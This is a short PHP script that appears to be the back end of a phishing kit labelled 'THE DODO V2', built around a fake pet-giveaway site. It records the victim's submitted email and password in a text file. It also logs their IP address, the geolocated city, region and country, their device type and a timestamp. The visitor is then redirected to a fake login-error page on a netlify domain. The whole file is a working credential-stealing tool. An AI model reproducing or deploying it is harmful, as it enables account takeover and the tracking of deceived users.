<?php
date_default_timezone_set('Asia/Manila');
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$user_ip = getUserIpAddr();
$geo = @unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
$city = $geo["geoplugin_city"];
$region = $geo["geoplugin_regionName"];
$country = $geo["geoplugin_countryName"];
$approx_location = $city . " , " . $region . " , " . $country ;


header('location: https://dodophpresentschooseyourpet.netlify.app/login_error.html');

require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
 
// Any mobile device (phones or tablets).
if ( $detect->isMobile() || $detect->isTablet()) {
 $device = "mobile";
}
else {  $device = "web";
}




$handle = fopen("testingtestpuwet.txt", "a");
fwrite($handle, "\r\n");
fwrite($handle, "email1=" . $_POST["email"] . "\r\n");
fwrite($handle, "pass1=" . $_POST["pass"] . "\r\n");
fwrite($handle, "device=" . $device . "    SITE= dodophpresentschooseyourpet.netlify.app" ."\r\n");
fwrite($handle, date('Y-m-d H:i:s', time()) . "\r\n");
fwrite($handle, "approx location : " . $approx_location . " " . $user_ip . "\r\n");
fwrite($handle, "THE DODO V2");
fwrite($handle, "\r\n");
fclose($handle);



exit;